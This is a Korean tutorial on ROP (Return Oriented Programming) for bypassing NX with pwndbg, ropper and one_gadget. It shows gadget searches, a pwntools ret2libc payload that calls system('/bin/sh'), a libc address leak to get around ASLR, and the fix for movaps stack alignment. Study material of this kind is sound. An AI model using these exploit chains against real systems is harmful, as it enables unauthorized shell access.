ROP란 — NX를 우회하는 원리

NX(Non-eXecutable) 비트가 켜지면 스택이나 힙에 셸코드를 올려도 실행이 안 된다. 그러나 이미 바이너리와 libc 안에 있는 코드(실행 권한이 있는 영역)는 실행할 수 있다.

ROP(Return Oriented Programming)는 ret 명령어로 끝나는 작은 코드 조각(가젯)을 이어붙여서 원하는 동작을 만든다. 스택에 가젯 주소들을 순서대로 쌓아두면, 각 가젯이 ret으로 다음 가젯 주소를 꺼내 이어서 실행한다. 

; ROP 체인 작동 원리
; 스택 (낮은 주소 →):
; [리턴 주소]       = gadget1 주소  (pop rdi; ret)
; [gadget1 다음]    = "/bin/sh" 주소  ← pop rdi가 여기서 읽음
; [그 다음]         = gadget2 주소  (ret)  ← 스택 정렬용
; [그 다음]         = system() 주소  ← 최종 호출

; 실행 흐름:
; 1. pop rdi → RDI = "/bin/sh"
; 2. ret → system() 호출
; → system("/bin/sh") 실행!

ropgadget — 런타임 가젯 탐색

# 로드된 모든 영역에서 가젯 탐색 (실행 중에만 가능)
pwndbg> ropgadget

# 특정 패턴 필터
pwndbg> ropgadget --filter "pop rdi"
pwndbg> ropgadget --filter "pop rsi"
pwndbg> ropgadget --filter "pop rdx"
pwndbg> ropgadget --filter "syscall"
pwndbg> ropgadget --filter "ret"      # ret 가젯 (스택 정렬용)

# libc 영역에서만 탐색
pwndbg> ropgadget --range 0x7ffff7a00000-0x7ffff7dc9000

# 출력 예시
# 0x000000000040119e : pop rdi ; ret
# 0x00000000004011a0 : pop rsi ; pop r15 ; ret

ropper — 더 강력한 가젯 탐색

# ropper는 pwndbg와 통합된 외부 도구
pwndbg> ropper -- --search "pop rdi"
pwndbg> ropper -- --search "pop rdi; ret"
pwndbg> ropper -- --type rop          # ROP 가젯 전체
pwndbg> ropper -- --type jop          # JOP 가젯

# 파일 직접 지정 (실행 전에도 가능)
# (터미널에서)
ropper -f ./vuln --search "pop rdi"
ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi"

ret2libc 체인 구성 — 실전 예시

가장 기본적인 ROP 패턴: system("/bin/sh") 호출. libc의 system()과 "/bin/sh" 문자열을 활용한다.

  • 1
    필요한 주소 수집 
    # libc 베이스 주소 (ASLR 없는 경우)
pwndbg> vmmap libc
# 0x7ffff7a00000 = libc base

# system() 주소
pwndbg> p system
# $1 = {int (const char *)} 0x7ffff7a52290 <system>

# "/bin/sh" 문자열 주소
pwndbg> search "/bin/sh"
# 0x7ffff7b97e9a — "/bin/sh"

# pop rdi ; ret 가젯
pwndbg> ropgadget --filter "pop rdi"
# 0x40119e : pop rdi ; ret

# ret 가젯 (스택 정렬 — 16바이트 정렬 필요 시)
pwndbg> ropgadget --filter "^ ret$"
# 0x40101a : ret
  • 2
    체인 구성 (pwntools로) 
    from pwn import *

OFFSET      = 72           # cyclic으로 찾은 오프셋
POP_RDI     = 0x40119e     # pop rdi ; ret
RET         = 0x40101a     # ret (스택 정렬)
BIN_SH      = 0x7ffff7b97e9a
SYSTEM      = 0x7ffff7a52290

payload  = flat(
    b"A" * OFFSET,
    RET,          # 스택 16바이트 정렬
    POP_RDI,      # pop rdi ; ret
    BIN_SH,       # → RDI = "/bin/sh"
    SYSTEM,       # → call system("/bin/sh")
)
  • 3
    pwndbg에서 체인 검증 
    # pop rdi 가젯에 BP
pwndbg> break *0x40119e
pwndbg> run < payload.bin

# BP 히트 후 스택 확인
pwndbg> telescope $rsp 4
# 00:0000│ rsp 0x7fff... —▸ 0x7ffff7b97e9a ("/bin/sh")
# 01:0008│     0x7fff... —▸ 0x7ffff7a52290 (system)

ASLR 환경에서의 ROP — libc 릭 필요

# ASLR 환경: libc 주소가 매번 달라짐
# 해결책: libc 주소를 런타임에 "릭"해서 base 계산

# 패턴: puts(got_entry) → libc 주소 출력 → 오프셋으로 base 계산

# 1. GOT의 puts 주소 확인
pwndbg> got              # GOT 테이블 전체
# puts@got = 0x404018

# 2. PLT의 puts 주소
pwndbg> plt              # PLT 테이블
# puts@plt = 0x401070

# 3. 릭 체인: pop rdi → got_puts → puts@plt → (다시 main)
# 출력된 값 = libc 내 puts() 실제 주소
# libc_base = 출력값 - puts_offset_in_libc

# puts offset 확인
pwndbg> p &puts - (long)0x7ffff7a00000   # libc base로부터 거리
# 또는 objdump로: readelf -s libc.so.6 | grep puts

one_gadget — 가젯 하나로 셸 얻기

# one_gadget: 조건이 맞으면 execve("/bin/sh") 하나로 셸 실행
# (터미널에서)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 출력 예시:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# pwndbg에서 제약 조건 확인
pwndbg> p $r15           # 제약 조건 레지스터 값 확인
pwndbg> p $r12
# 조건이 맞으면: libc_base + 0xe3afe 로 점프만 하면 셸!
💡
스택 정렬 문제 — movaps SIGSEGV

Ubuntu 18.04+ / glibc 2.29+에서 system() 내부의 movaps 명령어가 스택이 16바이트 정렬되지 않으면 SIGSEGV를 낸다. 이때 체인 앞에 ret 가젯 하나를 추가하면 해결된다. ret은 RSP를 8 증가시켜 정렬을 맞춘다.
